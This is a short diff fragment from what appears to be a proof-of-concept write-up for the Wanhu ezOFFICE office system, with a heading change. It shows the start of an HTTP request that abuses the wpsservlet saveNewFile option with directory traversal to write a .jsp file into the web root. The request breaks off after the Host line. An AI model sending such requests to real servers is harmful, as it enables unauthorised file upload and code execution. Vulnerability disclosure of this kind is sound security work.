@@ -7,7 +7,7 @@
 app="万户网络-ezOFFICE"
 ```
 
-## poc
+## POC
 ```
 POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=apoxkq&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
 Host: x.x.x.x
